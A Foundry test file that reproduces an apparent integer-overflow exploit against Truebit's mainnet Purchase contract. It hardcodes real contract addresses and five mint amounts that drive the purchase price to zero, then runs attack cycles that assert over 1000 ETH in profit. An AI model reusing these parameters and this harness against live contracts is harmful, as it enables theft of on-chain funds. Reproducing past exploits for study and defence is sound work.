// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/TruebitExploit.sol";

contract TruebitExploitTest is Test {
    TruebitExploit public exploit;

    address constant PURCHASE = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address constant TRU_TOKEN = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
    address constant ORIGINAL_ATTACKER = 0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50;

    uint256 constant AMOUNT_1 = 240442509453545333947284131;
    uint256 constant AMOUNT_2 = 441010174513890026925958238;
    uint256 constant AMOUNT_3 = 970752178501023300932298000;
    uint256 constant AMOUNT_4 = 2808567055501947160504720479;
    uint256 constant AMOUNT_5 = 12548923878784675664886517494;

    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        exploit = new TruebitExploit();
    }

    function test_VulnerabilityExists() public view {
        (bool isVulnerable, uint256 price) = exploit.checkVulnerability();
        console.log("=== Vulnerability Check ===");
        console.log("Price for AMOUNT_1:", price);
        console.log("Is Vulnerable:", isVulnerable);
        assertTrue(isVulnerable, "Contract should be vulnerable");
        assertEq(price, 0, "Price should be 0 due to overflow");
    }

    function test_InitialState() public view {
        (uint256 totalSupply, uint256 ethBalance) = exploit.getContractState();
        console.log("=== Initial Contract State ===");
        console.log("TRU Total Supply:", totalSupply);
        console.log("Purchase ETH Balance:", ethBalance);
        console.log("Purchase ETH Balance (ETH):", ethBalance / 1e18);
        assertGt(ethBalance, 0, "Contract should have ETH reserves");
    }

    function test_ExploitCycle1() public {
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker balance before:", attackerBalanceBefore / 1e18, "ETH");
        uint256 price = IPurchase(PURCHASE).getPurchasePrice(AMOUNT_1);
        console.log("Price to mint", AMOUNT_1, "TRU:", price);
        assertEq(price, 0, "Price should be 0");

        vm.startPrank(attacker);
        exploit.attackSingleCycle{value: 0.01 ether}(0);
        vm.stopPrank();

        uint256 attackerBalanceAfter = attacker.balance;
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore + 0.01 ether;

        console.log("Attacker balance after:", attackerBalanceAfter / 1e18, "ETH");
        console.log("Profit from cycle 1:", profit / 1e18, "ETH");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Should have made profit");
    }

    function test_FullExploit() public {
        (uint256 initialSupply, uint256 initialEthBalance) = exploit.getContractState();
        uint256 attackerInitialBalance = attacker.balance;
        console.log("--- Before Attack ---");
        console.log("TRU Total Supply:", initialSupply);
        console.log("Purchase ETH Balance:", initialEthBalance / 1e18, "ETH");
        console.log("Attacker Balance:", attackerInitialBalance / 1e18, "ETH");

        vm.startPrank(attacker);
        exploit.attack{value: 0.1 ether}();
        vm.stopPrank();

        (uint256 finalSupply, uint256 finalEthBalance) = exploit.getContractState();
        uint256 attackerFinalBalance = attacker.balance;

        console.log("--- After Attack ---");
        console.log("TRU Total Supply:", finalSupply);
        console.log("Purchase ETH Balance:", finalEthBalance / 1e18, "ETH");
        console.log("Attacker Balance:", attackerFinalBalance / 1e18, "ETH");

        uint256 profit = attackerFinalBalance - attackerInitialBalance + 0.1 ether;
        console.log("--- Results ---");
        console.log("Total Profit:", profit / 1e18, "ETH");
        assertGt(profit, 1000 ether, "Should have made significant profit (>1000 ETH)");
    }

    function test_DetailedCycleAnalysis() public {
        console.log("=== Detailed Cycle Analysis ===");

        uint256[5] memory amounts = [
            AMOUNT_1,
            AMOUNT_2,
            AMOUNT_3,
            AMOUNT_4,
            AMOUNT_5
        ];

        for (uint256 i = 0; i < 5; i++) {
            console.log("--- Cycle", i + 1, "---");
            uint256 price = IPurchase(PURCHASE).getPurchasePrice(amounts[i]);
            console.log("Amount to mint:", amounts[i]);
            console.log("Price required:", price);
            uint256 balanceBefore = attacker.balance;

            vm.startPrank(attacker);
            if (i > 0) {
                exploit = new TruebitExploit();
            }

            exploit.attackSingleCycle{value: price + 0.01 ether}(i);
            vm.stopPrank();

            uint256 balanceAfter = attacker.balance;
            int256 profitCycle = int256(balanceAfter) - int256(balanceBefore);
            console.log("Profit this cycle:", profitCycle > 0 ? uint256(profitCycle) / 1e18 : 0, "ETH");
            console.log("");
        }
    }
}
